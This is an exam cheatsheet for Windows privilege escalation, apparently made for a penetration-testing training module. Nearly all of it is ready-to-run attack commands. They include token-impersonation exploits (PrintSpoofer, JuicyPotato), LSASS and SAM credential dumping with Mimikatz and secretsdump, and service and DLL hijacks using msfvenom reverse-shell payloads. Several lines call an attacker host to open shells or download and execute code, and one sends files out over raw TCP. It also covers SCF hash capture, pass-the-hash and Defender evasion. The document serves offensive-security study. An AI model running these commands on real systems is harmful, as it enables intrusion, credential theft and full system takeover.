# 00 — Windows Privilege Escalation · EXAM CHEATSHEET

> Fast reference for the whole module (§01–33). Through-line:
> **`whoami /priv` → groups → services → creds → misconfig → kernel/CVE.** Enumerate at every privilege level — each step reveals the next.

---

## 0 · First 60 Seconds (run on EVERY shell)

```cmd
whoami /all                                   # user, groups, privileges — #1 fastest tell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"   # OS + arch
hostname                                      # know your box
net user %username%                           # group memberships
```

### Full Enum One-Liner (cmd)

```cmd
echo == WHOAMI == & whoami /priv & echo == SYSINFO == & systeminfo | findstr /B /C:"OS" /C:"System Type" /C:"Hotfix" & echo == USERS == & net localgroup Administrators & echo == SERVICES == & sc query state= all | findstr "SERVICE_NAME RUNNING" & echo == NETSTAT == & netstat -ano | findstr LISTENING & echo == INSTALLS == & wmic product get name,version 2>nul | head -20 & echo == SCHEDULED == & schtasks /query /fo LIST /v | findstr "Task To Run" | findstr /V "Microsoft"
```

### PowerShell Quick Enum

```powershell
whoami /all
Get-LocalUser | Select Name,Enabled,Description    # check description for passwords
Get-LocalGroupMember Administrators
Get-Process | Sort-Object CPU -Descending | Select -First 20
Get-ChildItem "C:\Program Files","C:\Program Files (x86)" | Select Name
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
```

### Automated Helpers

```cmd
:: WinPEAS (best all-in-one)
.\winPEASx64.exe

:: Seatbelt (targeted C# checks)
.\Seatbelt.exe -group=all

:: PowerUp (PowerShell — service misconfigs, AlwaysInstallElevated, unquoted paths)
Import-Module .\PowerUp.ps1; Invoke-AllChecks

:: SharpUp (C# version of PowerUp)
.\SharpUp.exe audit
```

---

## 1 · Token Privileges — THE Priority Check (§7-9)

```cmd
whoami /priv
```

| Privilege | Exploit | Tool |
|-----------|---------|------|
| **SeImpersonatePrivilege** | Potato attacks — steal SYSTEM token from COM/pipe | JuicyPotato, PrintSpoofer, SweetPotato, GodPotato |
| **SeAssignPrimaryTokenPrivilege** | Same as above — create process with stolen token | JuicyPotato |
| **SeDebugPrivilege** | Inject into/dump any process (LSASS) | Mimikatz, procdump, ProcDump64 |
| **SeTakeOwnershipPrivilege** | Take ownership of any file/registry key | takeown + icacls |
| **SeBackupPrivilege** | Read any file (bypass ACLs) | robocopy /B, reg save, diskshadow |
| **SeRestorePrivilege** | Write any file (DLL hijack system services) | robocopy, reg import |
| **SeLoadDriverPrivilege** | Load kernel driver → arbitrary code in kernel | Capcom.sys exploit |

### SeImpersonatePrivilege → SYSTEM (§7)

**Who has it:** IIS AppPool, MSSQL service, NETWORK SERVICE, LOCAL SERVICE

```cmd
:: PrintSpoofer (Win10/Server 2016+, fast)
PrintSpoofer64.exe -i -c cmd

:: JuicyPotato (Server 2016 and earlier — needs valid CLSID)
jp.exe -t * -l 4141 -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304} -p cmd.exe -a "/c nc64.exe KALI_IP PORT -e cmd.exe"

:: SweetPotato (broader compatibility)
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c nc64.exe KALI_IP PORT -e cmd.exe"

:: GodPotato (newest, .NET 4.x required)
GodPotato.exe -cmd "cmd /c whoami"
```

**CLSID reference for JuicyPotato:**
| OS | Working CLSID |
|----|---------------|
| Server 2016 | `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}` (WMI) |
| Server 2012 | `{8BC3F05E-D86B-11D0-A075-00C04FB68820}` |
| Windows 7/8 | `{6d18ad12-bde3-4393-b311-099c346e6df9}` |

### SeDebugPrivilege → Credential Dump (§8)

```cmd
:: Mimikatz (from elevated prompt with SeDebugPrivilege)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

:: Procdump LSASS → offline extraction
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
:: On Kali:
pypykatz lsa minidump lsass.dmp
```

### SeTakeOwnershipPrivilege (§9)

```cmd
:: Take ownership + grant yourself read
takeown /f "C:\path\to\protected\file.txt"
icacls "C:\path\to\protected\file.txt" /grant %username%:F
type "C:\path\to\protected\file.txt"
```

---

## 2 · Windows Groups (§10-15)

```cmd
whoami /groups
net localgroup Administrators
```

| Group | Technique |
|-------|-----------|
| **Backup Operators** | `reg save hklm\sam C:\tmp\sam` + `reg save hklm\system C:\tmp\sys` → secretsdump offline. Or `diskshadow` → copy NTDS.dit |
| **Event Log Readers** | `wevtutil qe Security /q:"*[EventData[Data='4688']]" /f:text` — find creds in process creation events |
| **DnsAdmins** | Inject malicious DLL via `dnscmd /config /serverlevelplugindll \\KALI\share\evil.dll` → restart DNS → SYSTEM |
| **Hyper-V Administrators** | Clone DC VHD, mount offline, extract NTDS.dit |
| **Print Operators** | Load drivers, SeLoadDriverPrivilege |
| **Server Operators** | Modify/start services → change binPath to reverse shell |

### Backup Operators — SAM Dump (§10)

```cmd
reg save hklm\sam C:\tmp\sam.save
reg save hklm\system C:\tmp\system.save
reg save hklm\security C:\tmp\security.save
```

```bash
# On Kali
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

---

## 3 · Service Misconfigurations (§17, §19)

### Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /V /C:"C:\Windows" | findstr /C:"Program"
```

If path has spaces and no quotes: drop exe at an intermediate path.
```
C:\Program Files\Some App\service.exe    ← unquoted
→ Drop: C:\Program.exe  OR  C:\Program Files\Some.exe
```

### Weak Service Permissions

```cmd
:: Check with accesschk (SysInternals)
accesschk64.exe -uwcqv "Everyone" * /accepteula
accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
accesschk64.exe -uwcqv "%username%" * /accepteula

:: If SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS:
sc config VulnService binpath= "cmd /c net localgroup Administrators htb-student /add"
sc stop VulnService
sc start VulnService
```

### Weak Service Binary Permissions

```cmd
:: Check if you can write to the service binary itself
icacls "C:\Program Files\Vuln App\service.exe"
:: If (M) or (F) for your user → replace the binary
copy /Y C:\tmp\reverse.exe "C:\Program Files\Vuln App\service.exe"
sc stop VulnService & sc start VulnService
```

### DLL Hijacking (§20)

```cmd
:: Find missing DLLs
procmon.exe        # Filter: Result=NAME NOT FOUND, Path ends with .dll
:: Or check service binary with:
Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.FileName -like "*missing*" }

:: Compile payload DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o hijack.dll
:: Place in writable PATH directory that's searched before the real DLL location
```

---

## 4 · AlwaysInstallElevated (§27)

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Both must be 0x1.** If yes → instant SYSTEM:

```bash
# On Kali — generate MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f msi -o shell.msi
```

```cmd
:: On target — install silently as SYSTEM
msiexec /quiet /qn /i C:\path\to\shell.msi
```

---

## 5 · Credential Hunting (§21-23)

### Common Credential Locations

```cmd
:: Unattend / Sysprep files (§21)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend\Unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep\Panther\Unattend.xml

:: Registry autologon
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

:: Saved credentials (Windows Credential Manager)
cmdkey /list
:: If entries exist:
runas /savecred /user:DOMAIN\admin cmd.exe

:: User description fields (often contain passwords!)
Get-LocalUser | Select Name,Description

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

:: PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt

:: IIS web.config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

:: Sticky Notes (Windows 10)
strings C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

### Credential Tools

```cmd
:: LaZagne (must run as SYSTEM for full results)
LaZagne.exe all

:: Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

:: Seatbelt credential checks
Seatbelt.exe -group=user
```

---

## 6 · UAC Bypass (§16)

```cmd
:: Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: 0x0 = no prompt (UAC off), 0x5 = default (prompt for non-Windows binaries)

:: Check if already elevated
whoami /groups | findstr "S-1-16-12288"      # High Mandatory Level = elevated
```

**If medium integrity (not elevated) but in Administrators group:**

```cmd
:: DiskCleanup scheduled task bypass (Windows 10)
:: Or use UACME: https://github.com/hfiref0x/UACME

:: SystemPropertiesAdvanced.exe DLL sideload
:: Place srrstr.dll in C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o srrstr.dll
SystemPropertiesAdvanced.exe    # loads our DLL without UAC prompt
```

---

## 7 · Kernel Exploits (§18, §29-30)

### Decision Tree

```
systeminfo →
├── Server 2008 R2 / Win7  → MS16-032 (Secondary Logon Handle)
│                           → MS15-051 (ClientCopyImage Win32k)
│                           → MS10-092 (Task Scheduler XML)
├── Server 2012 R2         → MS16-075 (RottenPotato)
├── Server 2016            → JuicyPotato (if SeImpersonatePrivilege)
├── Win10 1607-1809        → PrintSpoofer, SweetPotato
├── Win10 1903+            → PrintSpoofer, EfsPotato
└── Server 2019+           → PrintSpoofer, GodPotato
```

### MS16-032 (Server 2008 R2 / Win 7)

```powershell
# Download from Empire
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP:8000/Invoke-MS16032.ps1')
# Run (note: -Cmd not -Command, runs in new SYSTEM process)
Invoke-MS16-032 -Cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\htb-student\Desktop\flag.txt"
```

### Windows-Exploit-Suggester (from Kali)

```bash
# Save systeminfo output to file, then:
windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo sysinfo.txt
```

---

## 8 · Interacting with Users (§25)

### SCF File Attack (writable share)

```ini
; place on writable share as @malicious.scf (@ sorts to top)
[Shell]
Command=2
IconFile=\\KALI_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# On Kali — capture NTLMv2 hash
sudo responder -I tun0 -wPv
# Crack:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 9 · Pillaging (§26)

### mRemoteNG Credentials

```cmd
:: Config location
type "%APPDATA%\mRemoteNG\confCons.xml"
:: Decrypt with mremoteng_decrypt (Python tool on Kali)
```

### SAM/SYSTEM Hash Dump (from SYSTEM or Backup Operators)

```cmd
reg save hklm\sam C:\tmp\sam
reg save hklm\system C:\tmp\system
```

```bash
# On Kali
secretsdump.py -sam sam -system system LOCAL
# Crack NTLM:
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (once you have NTLM)

```bash
psexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u user -H NTLM_HASH
wmiexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH
```

---

## 10 · Miscellaneous Techniques (§27)

### LOLBAS (Living Off the Land Binaries)

Check https://lolbas-project.github.io/ for any binary that can:
- Download files (certutil, bitsadmin, curl)
- Execute code (rundll32, mshta, regsvr32, msiexec)
- Bypass AppLocker (MSBuild, InstallUtil)

```cmd
:: Download via certutil
certutil -urlcache -split -f http://KALI_IP:8000/payload.exe C:\tmp\payload.exe

:: Execute DLL
rundll32.exe \\KALI_IP\share\payload.dll,0
```

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v | findstr /V "Microsoft" | findstr "Task To Run"
:: Check if task binary/script is writable
icacls "C:\path\to\scheduled\script.bat"
```

---

## 11 · File Transfer Cheat (for exam)

```cmd
:: PowerShell (most reliable on modern Windows)
iwr http://KALI_IP:8000/file.exe -o C:\tmp\file.exe
(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8000/file','C:\tmp\file')

:: Certutil
certutil -urlcache -split -f http://KALI_IP:8000/file.exe C:\tmp\file.exe

:: SMB (if port 445 reachable from target)
copy \\KALI_IP\share\file.exe C:\tmp\file.exe

:: Raw TCP (when nothing else works)
:: Kali: nc -lvnp 4445 > received_file
:: Target:
powershell -c "$f=[IO.File]::ReadAllBytes('C:\file');$c=New-Object Net.Sockets.TcpClient('KALI_IP',4445);$s=$c.GetStream();$s.Write($f,0,$f.Length);$c.Close()"
```

---

## 12 · Exam Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│         WINDOWS PRIVESC — PRIORITY ORDER                │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. whoami /priv                                        │
│     └─ SeImpersonate? → PrintSpoofer/Potato → SYSTEM   │
│     └─ SeDebug? → Mimikatz/procdump → creds            │
│     └─ SeBackup? → reg save SAM/SYSTEM → hashes        │
│     └─ SeTakeOwnership? → takeown protected files      │
│                                                         │
│  2. whoami /groups + net localgroup Administrators      │
│     └─ Backup Operators? → SAM dump                    │
│     └─ DnsAdmins? → DLL injection                      │
│     └─ Server Operators? → service binPath swap        │
│                                                         │
│  3. Credential hunting                                  │
│     └─ Unattend.xml, web.config, PowerShell history    │
│     └─ Registry autologon, cmdkey /list                │
│     └─ User descriptions (Get-LocalUser)               │
│                                                         │
│  4. Service misconfigurations                           │
│     └─ Unquoted paths, weak permissions, DLL hijack    │
│     └─ AlwaysInstallElevated (both keys = 0x1)         │
│                                                         │
│  5. Scheduled tasks / autorun                           │
│     └─ Writable script/binary in scheduled task        │
│                                                         │
│  6. Kernel / CVE exploits                               │
│     └─ Legacy OS? MS16-032, MS15-051                   │
│     └─ Check with Watson, windows-exploit-suggester    │
│                                                         │
│  7. Post-exploitation (once SYSTEM)                     │
│     └─ reg save SAM/SYSTEM → secretsdump → hashcat    │
│     └─ Mimikatz logonpasswords                         │
│     └─ LaZagne all                                     │
│     └─ Check for disabled admin accounts (weak pass)   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 13 · Quick Reference — Common Answers

| Scenario | Vector |
|----------|--------|
| IIS AppPool / MSSQL service | SeImpersonatePrivilege → Potato/PrintSpoofer |
| `Unattend.xml` in Panther | Plaintext/base64 creds for domain admin |
| Both `AlwaysInstallElevated` = 1 | msfvenom MSI → msiexec /quiet → SYSTEM |
| Writable service binary | Replace with reverse shell, restart service |
| Server 2008 R2 / Win 7 | MS16-032 (Invoke-MS16032.ps1 from Empire) |
| Backup Operators group | reg save SAM/SYSTEM → secretsdump offline |
| DnsAdmins group | DLL plugin via dnscmd → restart DNS → SYSTEM |
| cmdkey /list shows saved creds | runas /savecred /user:admin cmd.exe |
| User description contains password | Get-LocalUser \| Select Description |
| Writable SMB share | SCF file → Responder → NTLMv2 → hashcat |
| Disabled local admin weak password | SAM dump → hashcat -m 1000 rockyou |

---

## 14 · Tools to Transfer

**Must-have on target (bring via HTTP/SMB):**

| Tool | Purpose | Location on Kali |
|------|---------|------------------|
| winPEASx64.exe | Comprehensive enumeration | `~/Downloads/winPEASx64.exe` |
| nc64.exe | Reverse shell / file transfer | `~/Downloads/nc64.exe` |
| PrintSpoofer64.exe | SeImpersonate → SYSTEM | `~/Downloads/PrintSpoofer64.exe` |
| JuicyPotato (jp.exe) | SeImpersonate → SYSTEM (legacy) | Download from GitHub |
| Mimikatz | Credential extraction | `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe` |
| LaZagne.exe | All stored credentials | Download from GitHub |
| Seatbelt.exe | Targeted enumeration | `~/tools/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe` |
| SharpUp.exe | Privesc checks | `~/tools/SharpCollection/NetFramework_4.7_x64/SharpUp.exe` |
| Rubeus.exe | Kerberos attacks | `~/tools/SharpCollection/NetFramework_4.7_x64/Rubeus.exe` |

---

## 15 · Firewall & AV Considerations

```cmd
:: Check Windows Firewall
netsh advfirewall show allprofiles state
netsh advfirewall firewall show rule name=all | findstr "LocalPort Direction Action"

:: Check Defender status
Get-MpComputerStatus | Select RealTimeProtectionEnabled
sc query windefend

:: If firewall blocks outbound — test common ports
:: 80, 443, 53, 8080 are commonly allowed
```

**Bypasses when Defender is ON:**
- Metasploit `smb_delivery` (reflective DLL in memory, no disk write)
- Custom payloads (msfvenom with shikata_ga_nai rarely works — use custom loaders)
- Living off the Land (LOLBAS) — no foreign binaries needed
- In-memory PowerShell (IEX + DownloadString)

**When firewall blocks most ports:**
- Use port 443 or 80 for callbacks (commonly whitelisted)
- DNS tunneling (dnscat2) if only DNS is allowed
- Reverse shell over existing allowed port
